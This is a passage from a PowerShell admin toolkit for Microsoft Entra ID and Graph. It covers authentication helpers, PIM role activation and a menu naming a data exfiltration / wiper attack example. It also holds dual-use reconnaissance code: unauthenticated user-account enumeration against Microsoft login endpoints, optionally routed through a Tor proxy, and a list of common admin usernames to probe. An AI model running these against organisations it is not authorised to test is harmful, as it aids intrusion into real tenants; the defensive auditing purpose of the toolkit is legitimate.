                Set-Clipboard $Snippet

                Write-Host -ForegroundColor "Yellow" ""
                Write-Host -ForegroundColor "Yellow" "Example copied to clipboard!"
                Write-Host -ForegroundColor "Yellow" ""
            }
            0 {
                break 
            } default {
                break
            }
        }
    }
	

    # Create example menu.
    $Choice = CreateMenu -MenuTitle "Copy DCToolbox example to clipboard" -MenuChoices "Microsoft Graph with PowerShell examples", "Manage Conditional Access as code", "Activate an Entra ID Privileged Identity Management (PIM) role", "Manage stale Entra ID accounts", "Azure MFA SMS and voice call methods cleanup script", "General PowerShell script template", "Entra ID Security Breach Kick-Out Process", "Microsoft 365 Data Exfiltration / Wiper Attack"
    

    # Handle menu choice.
    HandleMenuChoice -MenuChoice $Choice
}



function Confirm-DCPowerShellVersion {
    <#
        .SYNOPSIS
            Check that a supported PowerShell version is running.

        .INPUTS
            None

        .OUTPUTS
            None

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            Confirm-DCPowerShellVersion

        .EXAMPLE
            Confirm-DCPowerShellVersion -Verbose
    #>


    [CmdletBinding()]
    param ()


    Write-Verbose -Message "Checking PowerShell version..."
    if ($PSVersionTable.PSVersion.Major -lt 7) {
        Write-Error -Message "Please upgrade to PowerShell version 7 before running this command: https://learn.microsoft.com/en-us/powershell/scripting/install/installing-powershell-on-windows?view=powershell-7.3"

        return
    } else {
        Write-Verbose -Message "PowerShell $($PSVersionTable.PSVersion.Major).$($PSVersionTable.PSVersion.Minor) found!"
    }
}



function Install-DCMicrosoftGraphPowerShellModule {
    <#
        .SYNOPSIS
            Check, install, and update the Microsoft Graph PowerShell module.

        .INPUTS
            None

        .OUTPUTS
            None

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            Install-DCMicrosoftGraphPowerShellModule

        .EXAMPLE
            Install-DCMicrosoftGraphPowerShellModule -Verbose
    #>


    [CmdletBinding()]
    param ()


    Write-Verbose -Message "Looking for the Graph PowerShell module..."

    $ModuleVersion = Get-Module -ListAvailable -Name Microsoft.Graph.Authentication
    
    if (!($ModuleVersion)) {
        Write-Verbose -Message "Not found! Installing the Graph PowerShell module..."
        Install-Module Microsoft.Graph -Scope CurrentUser -Force
    } elseif (($ModuleVersion).Version.Major -lt 2 -and ($ModuleVersion).Version.Minor -lt 6) {
        Write-Verbose -Message "Found version $(($ModuleVersion).Version.Major).$(($ModuleVersion).Version.Minor). Upgrading..."
        Install-Module Microsoft.Graph -Scope CurrentUser -Force
    } else {
        Write-Verbose -Message "Graph PowerShell $(($ModuleVersion).Version.Major).$(($ModuleVersion).Version.Minor) found!"
    }
}



function Connect-DCMsGraphAsUser {
    <#
        .SYNOPSIS
            Connect to Microsoft Graph with the Microsoft Graph PowerShell module as a user (using delegated permissions in Graph).

        .PARAMETER Scopes
            The required API permission scopes (delegated permissions). Example: "Policy.ReadWrite.ConditionalAccess", "Policy.Read.All"

        .INPUTS
            None

        .OUTPUTS
            None

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            Connect-DCMsGraphAsUser -Scopes 'Policy.ReadWrite.ConditionalAccess', 'Policy.Read.All', 'Directory.Read.All'

        .EXAMPLE
            Connect-DCMsGraphAsUser -Scopes 'Policy.ReadWrite.ConditionalAccess', 'Policy.Read.All', 'Directory.Read.All' -Verbose
    #>


    [CmdletBinding()]
    param (
        [parameter(Mandatory = $true)]
        [string[]]$Scopes
    )


    # Authenticate to Microsoft Graph:
    Write-Verbose -Message "Connecting to Microsoft Graph..."

    Connect-MgGraph -NoWelcome -Scopes $Scopes
    
    Write-Verbose -Message "Connected!"
}



function Invoke-DCEntraIDDeviceAuthFlow {
    <#
        .SYNOPSIS
            Get a refresh token (or access token) from Entra ID using device code flow.

        .DESCRIPTION
            This CMDlet will start a device code flow authentication process in Entra ID. Go to the provided URL and enter the code to authenticate. The script will wait for the authentication and then return the refresh token, and also copy it to the clipboard.

            A refresh token fetched by this tool can be replayed on another device.
        
        .PARAMETER ShowTokenDetails
            Add this parameter if you want to display the token details on successful authentication.

        .PARAMETER ReturnAccessTokenInsteadOfRefreshToken
            Return an access token instead of a refresh token.

        .PARAMETER ClientID
            OPTIONAL: Specify the client ID for which a refresh token should be requested. Defaults to 'Microsoft Azure PowerShell' (1950a258-227b-4e31-a9cf-717495945fc2). If you set this parameter, you must also specify -TenantID. Note that the app registration in Entra ID must have device code flow enabled under Authentication > Advanced settings.

        .PARAMETER TenantID
            OPTIONAL: Specify your tenant ID. You only need to specify this if you're specifying a ClientID with -ClientID. This is because Microsoft needs to now in which tenant a specific app is located.
        
        .INPUTS
            None

        .OUTPUTS
            Entra ID Refresh Token

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            Invoke-DCEntraIDDeviceAuthFlow

        .EXAMPLE
            $RefreshToken = Invoke-DCEntraIDDeviceAuthFlow

        .EXAMPLE
            Invoke-DCEntraIDDeviceAuthFlow -ShowTokenDetails

        .EXAMPLE
            Invoke-DCEntraIDDeviceAuthFlow -ClientID '' -TenantID ''
    #>


    param (
        [parameter(Mandatory = $false)]
        [switch]$ShowTokenDetails,

        [parameter(Mandatory = $false)]
        [switch]$ReturnAccessTokenInsteadOfRefreshToken,

        [parameter(Mandatory = $false)]
        [string]$ClientID = '1950a258-227b-4e31-a9cf-717495945fc2',

        [parameter(Mandatory = $false)]
        [string]$TenantID = 'common'
    )


    # STEP 1: Get a device authentication code to use in browser.
    $Headers=@{}
    $Headers["Content-Type"] = 'application/x-www-form-urlencoded'

    $body = @{
        "client_id" = $ClientID
        "scope" = "openid offline_access"
    }

    $authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/devicecode" -Headers $Headers -Body $body

    Write-Host ""
    Write-Host -ForegroundColor Yellow "Go to this URL in any web browser:"
    Write-Host -ForegroundColor Cyan "   $($authResponse.verification_uri)"
    Write-Host ""
    Write-Host -ForegroundColor Yellow "Enter this code (it's in your clipboard):"
    $($authResponse.user_code) | Set-Clipboard
    Write-Host -ForegroundColor Cyan "   $($authResponse.user_code)"
    Write-Host ""


    # STEP 2: Wait for authentication to happen in browser, then get the refresh token and copy it to clipboard.
    Write-Host -ForegroundColor Yellow 'Waiting for browser sign-in...'

    for ($i = 0; $i -lt 60; $i++) {
        try {
            $body = @{
                "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"    
                "client_id" = $ClientID
                "device_code" = $authResponse.device_code
            }

            $Tokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token" -Headers $Headers -Body $body

            Write-Host ""
            Write-Host -ForegroundColor Green "SUCCESS!"

            if ($ShowTokenDetails) {
                Write-Host ""
                Write-Host -ForegroundColor Yellow "*** Details ***"
                Write-Host -ForegroundColor Yellow "Token expires in: $([math]::Round($Tokens.expires_in / 60)) minutes"
                Write-Host -ForegroundColor Yellow "Scope: $($Tokens.scope)"
            }

            if ($ReturnAccessTokenInsteadOfRefreshToken) {
                Write-Host ""
                Write-Host -ForegroundColor Yellow "Access token:"

                Write-Output $Tokens.access_token
                Write-Host ""
                Write-Host -ForegroundColor Yellow "Access token was copied to clipboard!"
                Write-Host ""
                $Tokens.access_token | Set-Clipboard
            } else {
                Write-Host ""
                Write-Host -ForegroundColor Yellow "Refresh token:"

                Write-Output $Tokens.refresh_token
                Write-Host ""
                Write-Host -ForegroundColor Yellow "Refresh token was copied to clipboard!"
                Write-Host ""
                $Tokens.refresh_token | Set-Clipboard
            }
            
            return
        } catch {
            if (($_ | ConvertFrom-Json).error -eq 'code_expired') {
                Write-Host ""
                Write-Host -ForegroundColor Red 'Verification code expired!'
                Write-Host ""
                return
            } elseif (($_ | ConvertFrom-Json).error -eq 'authorization_pending') {
                Start-Sleep -Seconds 5
            } else {
                Write-Host ""
                Write-Host -ForegroundColor Red ($_ | ConvertFrom-Json).error
                Write-Host ""
                return
            }
        }
    }
    Write-Host ""
    Write-Host -ForegroundColor Red 'Verification code expired!'
    Write-Host ""
}



function Connect-DCMsGraphAsApplication {
    <#
        .SYNOPSIS
            Connect to Microsoft Graph with application credentials.

        .DESCRIPTION
            This CMDlet will automatically connect to Microsoft Graph using application permissions (as opposed to delegated credentials). If successfull an access token is returned that can be used with other Graph CMDlets. Make sure you store the access token in a variable according to the example.

            Before running this CMDlet, you first need to register a new application in your Entra ID according to this article:
            https://danielchronlund.com/2018/11/19/fetch-data-from-microsoft-graph-with-powershell-paging-support/
            
        .PARAMETER ClientID
            Client ID for your Entra ID application.

        .PARAMETER ClientSecret
            Client secret for the Entra ID application.

        .PARAMETER TenantName
            The name of your tenant (example.onmicrosoft.com).
            
        .INPUTS
            None

        .OUTPUTS
            None

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            $AccessToken = Connect-DCMsGraphAsApplication -ClientID '8a85d2cf-17c7-4ecd-a4ef-05b9a81a9bba' -ClientSecret 'j[BQNSi29Wj4od92ritl_DHJvl1sG.Y/' -TenantName 'example.onmicrosoft.com'
    #>


    param (
        [parameter(Mandatory = $true)]
        [string]$ClientID,

        [parameter(Mandatory = $true)]
        [string]$ClientSecret,

        [parameter(Mandatory = $true)]
        [string]$TenantName
    )


    # Declarations.
    $LoginUrl = "https://login.microsoft.com"
    $ResourceUrl = "https://graph.microsoft.com"


    # Force TLS 1.2.
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    

    # Compose REST request.
    $Body = @{ grant_type = "client_credentials"; resource = $ResourceUrl; client_id = $ClientID; client_secret = $ClientSecret }
    $OAuth = Invoke-RestMethod -Method Post -Uri $LoginUrl/$TenantName/oauth2/token?api-version=1.0 -Body $Body
    

    # Return the access token.
    $OAuth.access_token
}



function Invoke-DCMsGraphQuery {
    <#
        .SYNOPSIS
            Run a Microsoft Graph query.

        .DESCRIPTION
            This CMDlet will run a query against Microsoft Graph and return the result. It will connect using an access token generated by Connect-DCMsGraphAsDelegated or Connect-DCMsGraphAsApplication (depending on what permissions you use in Graph).

            Before running this CMDlet, you first need to register a new application in your Entra ID according to this article:
            https://danielchronlund.com/2018/11/19/fetch-data-from-microsoft-graph-with-powershell-paging-support/
            
        .PARAMETER AccessToken
                An access token generated by Connect-DCMsGraphAsDelegated or Connect-DCMsGraphAsApplication (depending on what permissions you use in Graph).

        .PARAMETER GraphMethod
                The HTTP method for the Graph call, like GET, POST, PUT, PATCH, DELETE. Default is GET.

        .PARAMETER GraphUri
                The Microsoft Graph URI for the query. Example: https://graph.microsoft.com/v1.0/users/

        .PARAMETER GraphBody
                The request body of the Graph call. This is often used with methids like POST, PUT and PATCH. It is not used with GET.
            
        .INPUTS
            None

        .OUTPUTS
            None

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            Invoke-DCMsGraphQuery -AccessToken $AccessToken -GraphMethod 'GET' -GraphUri 'https://graph.microsoft.com/v1.0/users/'
    #>


    param (
        [parameter(Mandatory = $true)]
        [string]$AccessToken,

        [parameter(Mandatory = $false)]
        [string]$GraphMethod = 'GET',

        [parameter(Mandatory = $true)]
        [string]$GraphUri,

        [parameter(Mandatory = $false)]
        [string]$GraphBody = ''
    )

    # Check if authentication was successfull.
    if ($AccessToken) {
        # Format headers.
        $HeaderParams = @{
            'Content-Type'  = "application\json"
            'Authorization' = "Bearer $AccessToken"
        }


        # Create an empty array to store the result.
        $QueryRequest = @()
        $QueryResult = @()

        # Run the first query.
        if ($GraphMethod -eq 'GET') {
            $QueryRequest = Invoke-RestMethod -Headers $HeaderParams -Uri $GraphUri -UseBasicParsing -Method $GraphMethod -ContentType "application/json"
        }
        else {
            $QueryRequest = Invoke-RestMethod -Headers $HeaderParams -Uri $GraphUri -UseBasicParsing -Method $GraphMethod -ContentType "application/json" -Body $GraphBody
        }
        
        if ($QueryRequest.value) {
            $QueryResult += $QueryRequest.value
        }
        else {
            $QueryResult += $QueryRequest
        }


        # Invoke REST methods and fetch data until there are no pages left.
        if ($GraphUri -notlike "*`$top*") {
            while ($QueryRequest.'@odata.nextLink') {
                $QueryRequest = Invoke-RestMethod -Headers $HeaderParams -Uri $QueryRequest.'@odata.nextLink' -UseBasicParsing -Method $GraphMethod -ContentType "application/json"
    
                $QueryResult += $QueryRequest.value
            }
        }
        

        $QueryResult
    }
    else {
        Write-Error "No Access Token"
    }
}



function Enable-DCEntraIDPIMRole {
    <#
        .SYNOPSIS
            Activate an Entra ID Privileged Identity Management (PIM) role with PowerShell.

        .DESCRIPTION
            Uses the Graph PowerShell module to activate a user selected Entra ID role in Entra ID Privileged Identity Management (PIM).

            During activation, the user will be prompted to specify a reason for the activation.
        
        .PARAMETER RolesToActivate
            This parameter is optional but if you specify it, you can select multiple roles to activate at ones.

        .PARAMETER Reason
            Specify the reason for activating your roles.

        .PARAMETER UseMaximumTimeAllowed
            Use this switch to automatically request maximum allowed time for all role assignments.
            
        .INPUTS
            None

        .OUTPUTS
            None

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            Enable-DCEntraIDPIMRole

        .EXAMPLE
            Enable-DCEntraIDPIMRole -RolesToActivate 'Exchange Administrator', 'Security Reader'

        .EXAMPLE
            Enable-DCEntraIDPIMRole -RolesToActivate 'Exchange Administrator', 'Security Reader' -UseMaximumTimeAllowed

        .EXAMPLE
            Enable-DCEntraIDPIMRole -RolesToActivate 'Exchange Administrator', 'Security Reader' -Reason 'Performing some Exchange security configuration.' -UseMaximumTimeAllowed
    #>

    param (
        [parameter(Mandatory = $false)]
        [array]$RolesToActivate = @(),

        [parameter(Mandatory = $false)]
        [string]$Reason,

        [parameter(Mandatory = $false)]
        [switch]$UseMaximumTimeAllowed
    )


    # Set Error Action - Possible choices: Stop, SilentlyContinue
    $ErrorActionPreference = "Stop"



    # ----- [Execution] -----

    # Check PowerShell version.
    Confirm-DCPowerShellVersion -Verbose


    # Check Microsoft Graph PowerShell module.
    Install-DCMicrosoftGraphPowerShellModule -Verbose


    # Check if the MSAL module is installed.
    if (Get-Module -ListAvailable -Name "msal.ps") {
        # Do nothing.
    } else {
        Write-Verbose -Verbose -Message 'Installing MSAL module...'
        Install-Package msal.ps -Force | Out-Null
    }


    # Check if already connected to Entra ID.
    if (!(Get-MgContext)) {
        # Try to force MFA challenge (since it is often required for PIM role activation).
        Write-Verbose -Verbose -Message 'Connecting to Entra ID...'

        # Get token for MS Graph by prompting for MFA.
        $MsResponse = Get-MsalToken -Scopes @('https://graph.microsoft.com/.default') -ClientId "14d82eec-204b-4c2f-b7e8-296a70dab67e" -RedirectUri "urn:ietf:wg:oauth:2.0:oob" -Authority 'https://login.microsoftonline.com/common' -Interactive -ExtraQueryParameters @{claims = '{"access_token" : {"amr": { "values": ["mfa"] }}}' }

        Connect-MgGraph -NoWelcome -AccessToken (ConvertTo-SecureString $MsResponse.AccessToken -AsPlainText -Force)
    }


    # Fetch current user object ID.
    $CurrentAccount = (Get-MgContext).Account
    Write-Verbose -Message "Fetching eligible roles for $CurrentAccount..."
    $CurrentAccountId = (Get-MgUser -Filter "UserPrincipalName eq '$CurrentAccount'").Id
    

    # Fetch all Entra ID roles.
    $EntraIDRoleTemplates = Get-MgDirectoryRoleTemplate | Select-Object DisplayName, Description, Id | Sort-Object DisplayName

    
    # Fetch all PIM role assignments for the current user.
    $EntraIDEligibleRoleAssignments = Get-MgRoleManagementDirectoryRoleEligibilitySchedule -ExpandProperty RoleDefinition -All -Filter "principalId eq '$CurrentAccountId'"


    # Exit if no roles are found.
    if ($EntraIDEligibleRoleAssignments.Count -eq 0) {
        Write-Verbose -Verbose -Message ''
        Write-Verbose -Verbose -Message 'Found no eligible PIM roles to activate :('
        return
    }

    # Format the fetched information.
    $CurrentAccountRoles = foreach ($RoleAssignment in $EntraIDEligibleRoleAssignments) {
        $CustomObject = New-Object -TypeName psobject
        $CustomObject | Add-Member -MemberType NoteProperty -Name 'RoleDefinitionId' -Value $RoleAssignment.RoleDefinitionId
        $CustomObject | Add-Member -MemberType NoteProperty -Name 'DisplayName' -Value ($EntraIDRoleTemplates | Where-Object { $_.Id -eq $RoleAssignment.RoleDefinitionId } ).DisplayName

        $PolicyAssignment = Get-MgPolicyRoleManagementPolicyAssignment -Filter "scopeId eq '/' and scopeType eq 'DirectoryRole' and roleDefinitionId eq '$($RoleAssignment.RoleDefinitionId)'" -ExpandProperty "policy(`$expand=rules)"

        # Get the role management policy that's been assigned:
        $Policy = Get-MgPolicyRoleManagementPolicy -UnifiedRoleManagementPolicyId $PolicyAssignment.PolicyId

        # Get all policy rules belonging to this role management policy:
        $PolicyRules = Get-MgPolicyRoleManagementPolicyRule -UnifiedRoleManagementPolicyId $Policy.Id

        $MaximumDuration = ($PolicyRules | where id -eq 'Expiration_EndUser_Assignment').AdditionalProperties.maximumDuration

        $CustomObject | Add-Member -MemberType NoteProperty -Name 'maximumGrantPeriodInHours' -Value ($MaximumDuration -replace 'PT', '' -replace 'H', '')
        $CustomObject | Add-Member -MemberType NoteProperty -Name 'StartDateTime' -Value $RoleAssignment.StartDateTime
        $CustomObject | Add-Member -MemberType NoteProperty -Name 'EndDateTime' -Value $RoleAssignment.EndDateTime
        $CustomObject
    }

    
    # Write menu title.
    Write-Host -ForegroundColor "Yellow" ""
    Write-Host -ForegroundColor "Yellow" "*** Activate PIM Role for $CurrentAccount ***"
    Write-Host -ForegroundColor "Yellow" ""
    Write-Host -ForegroundColor "Cyan" "Note: To switch account/tenant, run Disconnect-MgGraph first."
    Write-Host -ForegroundColor "Yellow" ""

    # Check if parameter was specified, and if that is true, enable all roles.
    if (!($RolesToActivate)) {
        # Create a menu and prompt the user for role selection.

        # Create a counter.
        $Counter = 1
        
        # Generate the menu choices.
        foreach ($DisplayName in $CurrentAccountRoles.DisplayName) {
            Write-Host -ForegroundColor "Yellow" "[$Counter] $DisplayName"
            
            # Add to counter.
            $Counter = $Counter + 1
        }
        Write-Host -ForegroundColor "Yellow" "[0] Exit"
        
        # Write empty line.
        Write-Host -ForegroundColor "Yellow" ""
        
        # Prompt user for input.
        $Prompt = "Choice"
        $Answer = Read-Host $Prompt

        # Exit if requested.
        if ($Answer -eq 0) {
            return
        }

        # Exit if nothing is selected.
        if ($Answer -eq '') {
            return
        }

        # Exit if no role is selected.
        if (!($CurrentAccountRoles[$Answer - 1])) {
            return
        }

        $RolesToActivate = @($CurrentAccountRoles[$Answer - 1])
    }
    else {
        Write-Host 'Roles to activate:'
        Write-Host ''

        $RolesToActivate = foreach ($Role in $RolesToActivate) {
            if ($CurrentAccountRoles.DisplayName -contains $Role) {
                Write-Host $Role
                $CurrentAccountRoles | Where-Object { $_.DisplayName -eq $Role }
            }
        }
    }

    # Prompt user for reason.
    Write-Host ''

    if (!($Reason)) {
        $Prompt = "Reason"
        $Reason = Read-Host $Prompt
    }


    foreach ($Role in $RolesToActivate) {
        # Check if PIM-role is already activated.
        $Duration = 0

        if ($UseMaximumTimeAllowed) {
            $Duration = ($Role.maximumGrantPeriodInHours)
        }
        else {
            # Prompt user for duration.
            if (!($Duration = Read-Host "Duration for '$($Role.DisplayName)' [$($Role.maximumGrantPeriodInHours) hour(s)]")) {
                $Duration = $Role.maximumGrantPeriodInHours
            }
        }


        # Activate PIM role.
        Write-Verbose -Verbose -Message "Activating PIM role '$($Role.DisplayName)'..."


        # Check for existing role activation before activating:
        $Result = ''
        $ExistingActivations = Get-MgRoleManagementDirectoryRoleAssignmentSchedule -Filter "PrincipalId eq '$CurrentAccountId' and RoleDefinitionId eq '$($Role.RoleDefinitionId)'"

        if ($ExistingActivations) {
            $params = @{
                "PrincipalId" = "$CurrentAccountId"
                "RoleDefinitionId" = "$($Role.RoleDefinitionId)"
                "DirectoryScopeId" = "/"
                "Action" = "SelfDeactivate"
            }
                
            $Result = New-MgRoleManagementDirectoryRoleAssignmentScheduleRequest -BodyParameter $params
        }

        $params = @{
            "PrincipalId" = "$CurrentAccountId"
            "RoleDefinitionId" = "$($Role.RoleDefinitionId)"
            "Justification" = "$Reason"
            "DirectoryScopeId" = "/"
            "Action" = "SelfActivate"
            "ScheduleInfo" = @{
                "StartDateTime" = Get-Date
                "Expiration" = @{
                    "Type" = "AfterDuration"
                    "Duration" = "PT$Duration`H"
                }
            }
        }
            
        $Result = New-MgRoleManagementDirectoryRoleAssignmentScheduleRequest -BodyParameter $params


        Write-Verbose -Verbose -Message "$($Role.DisplayName) has been activated until $(Get-Date -Format 'f' -Date ((Get-Date).AddHours($Duration)))!"
    }
}



function Get-DCPublicIp {
    <#
        .SYNOPSIS
            Get current public IP address information.

        .DESCRIPTION
            Get the current public IP address and related information. The ipinfo.io API is used to fetch the information. You can use the -UseTorHttpProxy to route traffic through a running Tor network HTTP proxy that was started by Start-DCTorHttpProxy.
            
        .PARAMETER UseTorHttpProxy
            Route traffic through a running Tor network HTTP proxy that was started by Start-DCTorHttpProxy.
            
        .INPUTS
            None

        .OUTPUTS
            Public IP address information.

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            Get-DCPublicIp

        .EXAMPLE
            (Get-DCPublicIp).ip

        .EXAMPLE
            Write-Host "$((Get-DCPublicIp).city) $((Get-DCPublicIp).country)"
    #>


    param (
        [parameter(Mandatory = $false)]
        [switch]$UseTorHttpProxy
    )

    if ($UseTorHttpProxy) {
        Invoke-RestMethod -Proxy "http://127.0.0.1:9150" -Method "Get" -Uri "https://ipinfo.io/json"
    }
    else {
        Invoke-RestMethod -Method "Get" -Uri "https://ipinfo.io/json"
    }
}



function Start-DCTorHttpProxy {
    <#
        .SYNOPSIS
            Start a Tor network HTTP proxy for anonymous HTTP calls via PowerShell.

        .DESCRIPTION
            Start a Tor network HTTP proxy that can be used for anonymization of HTTP traffic in PowerShell. Requires proxy support in the PowerShell CMDlet you want to anonymise. Many of the tools included in DCToolbox supports this.

            Start the proxy:
            Start-DCTorHttpProxy

            The proxy will launch in a new PowerShell window that you can minimize.
            
            You can test it out (and find your currentn Tor IP address and location) with:
            Get-DCPublicIp -UseTorHttpProxy

            For other CMDlets, use the following proxy configuration:
            127.0.0.1:9150

            Note: This CMDlet expects the Tor browser to be installed under C:\Temp\Tor Browser. You can change the path with -TorBrowserPath.

            Download Tor browser:
            https://www.torproject.org/download/
            
        .PARAMETER TorBrowserPath
            The path to the Tor browser directory. Default is 'C:\Temp\Tor Browser'.
            
        .INPUTS
            None

        .OUTPUTS
            None

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            Start-DCTorHttpProxy
    #>


    param (
        [parameter(Mandatory = $false)]
        [string]$TorBrowserPath = 'C:\Temp\Tor Browser'
    )


    # Configuration
    $torBrowser = $TorBrowserPath
    $TOR_HOST = "127.0.0.1"
    $TOR_PORT = 9150
    $CTRL_PORT = 9151

    # Do not modify these
    $tor_location = "$torBrowser\Browser\TorBrowser\Tor"
    $torrc_defaults = "$torBrowser\Browser\TorBrowser\Data\Tor\torrc-defaults"
    $torrc = "$torBrowser\Browser\TorBrowser\Data\Tor\torrc"
    $tordata = "$torBrowser\Browser\TorBrowser\Data\Tor"
    $geoIP = "$torBrowser\Browser\TorBrowser\Data\Tor\geoip"
    $geoIPv6 = "$torBrowser\Browser\TorBrowser\Data\Tor\geoip6"
    $torExe = "$tor_location\tor.exe"
    $controllerProcess = $PID

    function Get-OneToLastItem {
        param ($arr) return $arr[$arr.Length - 2] 
    }

    $Command = "Write-Host '*** Running Tor HTTPS Proxy ***' -ForegroundColor Green; Write-Host ''; Write-Host 'Press [Ctrl+C] to stop Tor service.' -ForegroundColor Gray; Write-Host ''; & '$torExe' --defaults-torrc '$torrc_defaults' -f '$torrc' DataDirectory '$tordata' GeoIPFile '$geoIP' GeoIPv6File '$geoIPv6' +__ControlPort $CTRL_PORT +__HTTPTunnelPort '${TOR_HOST}:$TOR_PORT IPv6Traffic PreferIPv6 KeepAliveIsolateSOCKSAuth' __OwningControllerProcess $controllerProcess | more"

    try {
        Start-Process "`"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`"" "-NoExit -Command $Command"

        Write-Host -ForegroundColor "Yellow" "Running Tor HTTPS Proxy on $TOR_HOST`:$TOR_PORT"
        Write-Host ""
    }
    catch {
        Write-Error -Message $PSItem.Exception.Message
    }
}



function Test-DCEntraIDUserExistence {
    <#
        .SYNOPSIS
            Test if an account exists in Entra ID for specified email addresses.
        
        .DESCRIPTION
            This CMDlet will connect to public endpoints in Entra ID to find out if an account exists for specified email addresses or not. This script works without any authentication to Entra ID. This is called user enumeration in cyber security.
            
            The script can't see accounts for federated domains (since they are on-prem accounts) but it will tell you what organisation the federated domain belongs to.

            Do not use this script in an unethical or unlawful way. Use it to find weak spots in you Entra ID configuration.
        
        .PARAMETER Users
            An array of one or more user email addresses to test.

        .PARAMETER UseTorHttpProxy
            Use a running Tor network HTTP proxy that was started by Start-DCTorHttpProxy.
        
        .EXAMPLE
            Test-DCEntraIDUserExistence -UseTorHttpProxy -Users "user1@example.com", "user2@example.com", "user3@example.onmicrosoft.com"
        
        .INPUTS
            None

        .OUTPUTS
            None
        
        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
	#>


    param (
        [parameter(Mandatory = $true)]
        [array]$Users,

        [parameter(Mandatory = $false)]
        [switch]$UseTorHttpProxy
    )

    foreach ($User in $Users) {
        # Create custom object for output.
        $TestObject = New-Object -TypeName psobject

        # Add username.
        $TestObject | Add-Member -MemberType NoteProperty -Name "Username" -Value $User

        # Check if user account exists in Entra ID.
        $IfExistsResult = 1

        if ($UseTorHttpProxy) {
            $IfExistsResult = ((Invoke-WebRequest -Proxy "http://127.0.0.1:9150" -Method "POST" -Uri "https://login.microsoftonline.com/common/GetCredentialType" -Body "{`"Username`":`"$User`"}").Content | ConvertFrom-Json).IfExistsResult
        }
        else {
            $IfExistsResult = ((Invoke-WebRequest -Method "POST" -Uri "https://login.microsoftonline.com/common/GetCredentialType" -Body "{`"Username`":`"$User`"}").Content | ConvertFrom-Json).IfExistsResult
        }

        if ($IfExistsResult -eq 0) {   
            # Check domain federation status.
            [xml]$Response = ""

            if ($UseTorHttpProxy) {
                [xml]$Response = (Invoke-WebRequest -Proxy "http://127.0.0.1:9150" -Uri "https://login.microsoftonline.com/getuserrealm.srf?login=$User&xml=1").Content
            }
            else {
                [xml]$Response = (Invoke-WebRequest -Uri "https://login.microsoftonline.com/getuserrealm.srf?login=$User&xml=1").Content
            }

            # Add org information.
            $TestObject | Add-Member -MemberType NoteProperty -Name "Org" -Value $Response.RealmInfo.FederationBrandName
			
            # If domain is Federated we can't tell if the account exists or not :(
            if ($Response.RealmInfo.IsFederatedNS -eq $true) {
                $TestObject | Add-Member -MemberType NoteProperty -Name "UserExists" -Value "Unknown (federated domain: $((($Response.RealmInfo.AuthURL -split "//")[1] -split "/")[0]))"
            }
            # If the domain is Managed (not federated) we can tell if an account exists in Entra ID :)
            else {
                $TestObject | Add-Member -MemberType NoteProperty -Name "UserExists" -Value "Yes"
            }
        }
        else {
            $TestObject | Add-Member -MemberType NoteProperty -Name "UserExists" -Value "No"
        }

        $TestObject
    }   
}



function Test-DCEntraIDCommonAdmins {
    <#
        .SYNOPSIS
            Test if common and easily guessed admin usernames exist for specified Entra ID domains.
        
        .DESCRIPTION
            Uses Test-DCEntraIDUserExistence to test if common and weak admin account names exist in specified Entra ID domains. It uses publicaly available Microsoft endpoints to query for this information. Run help Test-DCEntraIDUserExistence for more info.

            Do not use this script in an unethical or unlawful way. Use it to find weak spots in you Entra ID configuration.
        
        .PARAMETER Domains
            An array of one or more domains to test.

        .PARAMETER UseTorHttpProxy
            Use a running Tor network HTTP proxy that was started by Start-DCTorHttpProxy.
        
        .EXAMPLE
            Test-DCEntraIDCommonAdmins -UseTorHttpProxy -Domains "example.com", "example2.onmicrosoft.com"
        
        .INPUTS
            None

        .OUTPUTS
            None
        
        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
	#>

	
    param (
        [parameter(Mandatory = $true)]
        [array]$Domains,
		
        [parameter(Mandatory = $false)]
        [switch]$UseTorHttpProxy
    )

    $CommonAdminUsernames = "admin@DOMAINNAME",
    "administrator@DOMAINNAME",
    "root@DOMAINNAME",
    "system@DOMAINNAME",
    "operator@DOMAINNAME",
    "super@DOMAINNAME",
    "breakglass@DOMAINNAME",
    "breakglass1@DOMAINNAME",
    "breakglass2@DOMAINNAME",
    "serviceaccount@DOMAINNAME",
    "service@DOMAINNAME",
    "srv@DOMAINNAME",
    "svc@DOMAINNAME",
    "smtp@DOMAINNAME",
    "smtprelay@DOMAINNAME",
    "mail@DOMAINNAME",
    "exchange@DOMAINNAME",
    "sharepoint@DOMAINNAME",
    "teams@DOMAINNAME",
    "azure@DOMAINNAME",
    "user@DOMAINNAME",
    "user1@DOMAINNAME",
    "user01@DOMAINNAME",
